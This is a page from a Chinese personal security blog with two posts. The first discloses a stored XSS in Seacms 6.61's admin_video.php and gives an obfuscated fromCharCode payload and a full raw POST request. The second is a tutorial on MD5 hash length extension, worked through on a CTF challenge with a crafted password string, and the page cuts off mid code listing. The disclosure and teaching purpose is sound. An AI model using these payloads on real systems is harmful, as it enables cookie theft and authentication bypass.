<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Welcome to Jas0nwhy&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="嘻嘻嘻，搞事情">
<meta property="og:type" content="website">
<meta property="og:title" content="Welcome to Jas0nwhy&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/child/index.html">
<meta property="og:site_name" content="Welcome to Jas0nwhy&#39;s Blog">
<meta property="og:description" content="嘻嘻嘻，搞事情">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Welcome to Jas0nwhy&#39;s Blog">
<meta name="twitter:description" content="嘻嘻嘻，搞事情">
  
    <link rel="alternative" href="/atom.xml" title="Welcome to Jas0nwhy&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/http://ww4.sinaimg.cn/large/a15b4afegy1fmpyh1revgj20hs0hsdgg">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
        <a href="/" class="profilepic">
            
            <img lazy-src="http://ww4.sinaimg.cn/large/a15b4afegy1fmpyh1revgj20hs0hsdgg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">jas0nwhy</a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=86 src="//music.163.com/outchain/player?type=2&id=532166475&auto=1&height=66"></iframe>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="https://jas0nwhy.github.io/">博客首页</a></li>
                        
                            <li><a  href="/archives">文章归档</a></li>
                        
                            <li><a  href="/CTFStudy">学习导航</a></li>
                        
                            <li><a  href="/PWNABLE">PWNABLE</a></li>
                        
                            <li><a  href="/resume">个人简历</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail"  target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rZyZmJuZmJ2UmJzt3NyDzsLA" title="mail">mail</a>
                            
                                <a class="fl github"  target="_blank" href="https://github.com/Jas0nwhy/jas0nwhy.github.io" title="github">github</a>
                            
                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/jasontu-sen-po/activities" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo"  target="_blank" href="https://weibo.com/6446326734/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/Google-hacking/" style="font-size: 10px;">Google hacking</a> <a href="/tags/MSF/" style="font-size: 10px;">MSF</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Seacms/" style="font-size: 10px;">Seacms</a> <a href="/tags/ctf/" style="font-size: 16.67px;">ctf</a> <a href="/tags/python/" style="font-size: 13.33px;">python</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/代码审计/" style="font-size: 10px;">代码审计</a> <a href="/tags/关于我/" style="font-size: 10px;">关于我</a> <a href="/tags/变量覆盖/" style="font-size: 10px;">变量覆盖</a> <a href="/tags/学习历程/" style="font-size: 10px;">学习历程</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/技术/" style="font-size: 20px;">技术</a> <a href="/tags/文件解析/" style="font-size: 10px;">文件解析</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a>
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">K0sh1</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/">信鑫</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://bystudent.com/">ByStundet表哥</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/">汪神_Jarvis</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://sh3ll.me/">Chu</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3m0n</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/">muhe</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/">_画船听雨</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html">Virink</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/">老锥</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cizel.cn/">C1zel</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://1phan.cc">1phan</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.liuil.top/">liuil</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://burnegg.com/">burnegg</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://jwrsec.cn/">jwr-sec</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://sudalover.cn/">苏打</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.binklac.com">VeroFess</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.bendawang.site/">bendawang</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/">hook</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.flier.net.cn/">Flier&#39;blog</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.mutepig.club">mutepig</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://blog.iret.xyz/list.aspx">Silver</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://simp1e.leanote.com/">Simple</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://processor.pub/">Processor</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">一只什么都不会的咸鱼</div>
                </section>
                
		     </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">jas0nwhy</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/http://ww4.sinaimg.cn/large/a15b4afegy1fmpyh1revgj20hs0hsdgg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">jas0nwhy</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="https://jas0nwhy.github.io/">博客首页</a></li>
                
                    <li><a href="/archives">文章归档</a></li>
                
                    <li><a href="/CTFStudy">学习导航</a></li>
                
                    <li><a href="/PWNABLE">PWNABLE</a></li>
                
                    <li><a href="/resume">个人简历</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rZyZmJuZmJ2UmJzt3NyDzsLA" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/Jas0nwhy/jas0nwhy.github.io" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/jasontu-sen-po/activities" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="https://weibo.com/6446326734/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-seacms6.61xss" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/07/25/seacms6.61xss/" class="article-date">
      <time datetime="2018-07-25T03:35:12.000Z" itemprop="datePublished">2018-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/25/seacms6.61xss/">Seacms6.61xss漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="Seacms-V6-61-has-XSS-vulnerability-in-site-name-parameter-of-admin-video-php"><a href="#Seacms-V6-61-has-XSS-vulnerability-in-site-name-parameter-of-admin-video-php" class="headerlink" title="Seacms V6.61 has XSS vulnerability in site name parameter of admin_video.php"></a>Seacms V6.61 has XSS vulnerability in site name parameter of admin_video.php</h3><h4 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h4><p>Seacms 6.61  </p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details/open/ontoggle=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(100)+String.fromCharCode(111)+String.fromCharCode(99)+String.fromCharCode(117)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(110)+String.fromCharCode(116)+String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(111)+String.fromCharCode(107)+String.fromCharCode(105)+String.fromCharCode(101)+String.fromCharCode(41))&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>POST /ADMIN/admin_video.php?action=save&amp;acttype=add HTTP/1.1<br>Host: cms.jas0nwhy.top<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://cms.jas0nwhy.top/ADMIN/admin_video.php?action=add" target="_blank" rel="noopener">http://cms.jas0nwhy.top/ADMIN/admin_video.php?action=add</a><br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 1354<br>Cookie: PHPSESSID=8k4mkaq9l3ps7dcrcvafetelt6; HISTORY={video:[{“name”:”123”,”link”:”<a href="http://cms.jas0nwhy.top/detail/?8.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(xss)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?1.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(document.cookie)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?5.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;}]}" target="_blank" rel="noopener">http://cms.jas0nwhy.top/detail/?8.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(xss)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?1.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(document.cookie)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?5.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;}]}</a><br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1</p>
<p>v_commend=0&amp;v_name=test&amp;v_enname=test&amp;v_color=&amp;v_type=5&amp;v_state=&amp;v_pic=&amp;v_spic=&amp;v_gpic=&amp;v_actor=&amp;v_director=&amp;v_commend=0&amp;v_note=&amp;v_tags=&amp;select3=&amp;v_publishyear=&amp;select2=&amp;v_lang=&amp;select1=&amp;v_publisharea=&amp;select4=&amp;v_ver=&amp;v_hit=0&amp;v_monthhit=0&amp;v_weekhit=0&amp;v_dayhit=0&amp;v_len=&amp;v_total=&amp;v_nickname=&amp;v_company=&amp;v_tvs=&amp;v_douban=&amp;v_mtime=&amp;v_imdb=&amp;v_score=&amp;v_scorenum=&amp;v_longtxt=&amp;v_money=0&amp;v_psd=123&amp;v_playfrom%5B1%5D=%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD&amp;v_playurl%5B1%5D=test&amp;m_downfrom%5B1%5D=%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%E4%B8%80&amp;m_downurl%5B1%5D=test&amp;v_content=%3Ccode%3E%26lt%3Bdetails%2Fopen%2Fontoggle%3Deval%28String.fromCharCode%2897%29%2BString.fromCharCode%28108%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28114%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2840%29%2BString.fromCharCode%28100%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%2899%29%2BString.fromCharCode%28117%29%2BString.fromCharCode%28109%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28110%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2846%29%2BString.fromCharCode%2899%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%28107%29%2BString.fromCharCode%28105%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%2841%29%29%26gt%3B%3C%2Fcode%3E&amp;Submit=%E7%A1%AE%E5%AE%9A%E6%8F%90%E4%BA%A4<br>```</p>
<h4 id="vulnerability-trigger-point"><a href="#vulnerability-trigger-point" class="headerlink" title="vulnerability trigger point"></a>vulnerability trigger point</h4><p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms1.JPG?raw=true" alt="image">  </p>
<p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms2.JPG?raw=true" alt="image">  </p>
<p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms3.JPG?raw=true" alt="image"></p>
<p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms4.JPG?raw=true" alt="image">  </p>
<p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms5.jpg?raw=true" alt="image"></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Seacms/">Seacms</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-hash长度扩展攻击(1)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/07/20/hash长度扩展攻击(1)/" class="article-date">
      <time datetime="2018-07-20T03:35:12.000Z" itemprop="datePublished">2018-07-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/20/hash长度扩展攻击(1)/">hash长度扩展攻击</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h3><h4 id="MD5加密算法"><a href="#MD5加密算法" class="headerlink" title="MD5加密算法"></a>MD5加密算法</h4><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftiqli9nbjj30rz0hjq4r.jpg" alt="image">  </p>
<h5 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h5><p>首先要知道md5的运算都是将明文分割为以512bit（64字节）一组进行运算的，而最后一组不够512bit另做处理  </p>
<h5 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h5><p>最后一组将含有两部分有效信息，一是明文%512bit的数据，二是记录的原消息总长（固定占有64位，也就是8个字节），那么其中剩下的位置=512-64-明文%512bit的部分由100000…（在16进制中为800000…）补满<br>例：<img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftir5g26ywj30io02pmwx.jpg" alt="image"><br>前面的616263是明文的尾部，800000…是补位的，1800…是明文长度   </p>
<h5 id="链接变量"><a href="#链接变量" class="headerlink" title="链接变量"></a>链接变量</h5><p>链接变量最开始是ABCD四个初始序列，共128位  </p>
<pre><code>A=0x67452301

B=0xefcdab89

C=0x98badcfe

D=0x10325476   
</code></pre><p>将第一组链接变量与第一组明文进行复杂运算，算出一组新的A,B,C,D的值，如果消息小于512，也就是只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，就用第一次算的MD5的值进行后面部分的运算算出新的MD5值，以此类推。  </p>
<h4 id="长度扩展攻击原理"><a href="#长度扩展攻击原理" class="headerlink" title="长度扩展攻击原理"></a>长度扩展攻击原理</h4><p>加入有这么一个情况，有一个需要MD5加密的字符串C由A和B两部分组成，A是未知的（也可以理解为salt）但是我们知道它的长度和MD5值，B是已知的且可控的，那么<br>我们将B的值构造一下，就可以得到字符串C的值。  </p>
<h5 id="引子："><a href="#引子：" class="headerlink" title="引子："></a>引子：</h5><p>假如A为test（十六进制为0x74657374）<br>那么我们构造B，使A+B等于512位，且形式与需要补位的最后一组一样  </p>
<pre><code>B=800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000   
</code></pre><p>接着在后面添加上B=0x746573748，此时str将大于512位，md5加密时系统会自动补位为1024位，并分为两组</p>
<pre><code>第一组=74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000

第二组=74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000   
</code></pre><p>这样程序先计算第一部分，得到ABCD链接变量  </p>
<pre><code>A=0xcd6b8f09

B=0x73d32146

C=0x834edeca

D=0xf6b42726
</code></pre><p>第二部分就用第一部分的ABCD链接变量去运算得到新的ABCD链接变量  </p>
<pre><code>A=0x226359e5

b=0x99df12eb

C=0x6853f59e

D=0xf5406385  
</code></pre><p>最后高低位逆序得到MD5值e5596322eb12df999ef55368856340f5   </p>
<h5 id="攻击："><a href="#攻击：" class="headerlink" title="攻击："></a>攻击：</h5><p>现在我们知道A长度是4，MD5值高低位逆序得到的ABCD链接变量是</p>
<pre><code>A=0xcd6b8f09

B=0x73d32146

C=0x834edeca

D=0xf6b42726   
</code></pre><p>这时我们构造</p>
<pre><code>B=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00test  
</code></pre><p>这时C大于512位，补位为1024位，其实前512位得到的ABCD我们已经知道，那么如果我们把初始链接变量改为前512位得到的ABCD计算一下0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000<br>的MD5，发现是e5596322eb12df999ef55368856340f5，这样两个不同的b值得到了一样的MD5值   </p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>通过实例更好理解，这是实验吧的让我进去<br><img src="https://screenshotscdn.firefoxusercontent.com/images/0804fc7f-c908-48af-afc1-6ac0ace595c3.png" alt="image"><br>随便输入username和admin抓包<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1ftiz6v0sn9j30xv07ajsz.jpg" alt="image"><br>将source值改为1发包得到关键源码  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</span><br><span class="line"></span><br><span class="line">$username = $_POST[&quot;username&quot;];</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">    //要求username要等于admin，但是password要不等于admin</span><br><span class="line">    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</span><br><span class="line">        //要求传入的getmein值要等于MD5加密后的salt+username+password</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//这里规定sample-hash值为MD5加密后的salt+adminadmin</span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if ($_COOKIE[&quot;source&quot;] != 0) &#123;</span><br><span class="line">        echo &quot;&quot;; // This source code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这道题要求我们post传入的username=admin，password！=admin，又要$COOKIE[“getmein”] === md5($secret . urldecode($username . $password)),这里就要用到hash长度扩展攻击<br>现在我们知道了：<br>salt的长度是15<br>salt+adminadmin的MD5值是571580b26c65f306376d4f64e53cb5c7<br>那么，我们现在就要开始构造password=</p>
<pre><code>admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin
</code></pre><p>使得拼接后的字符串为</p>
<pre><code>012345678901234adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin  
</code></pre><p>这里利用password将拼接字符串大于512位，系统将自动补位为1024位，前512位的MD5值就是MD5(salt+admin+admin)(这个我们是已知的，就是sample-hash)，那么我们将sample—hash的值高低位逆序得到的ABCD链接向量换掉初始ABCD链接向量进行MD5运算(也就是直接运算第二组),最终得到的值就是md5($secret . urldecode($username . $password))<br>更换初始链接变量进行MD5运算代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 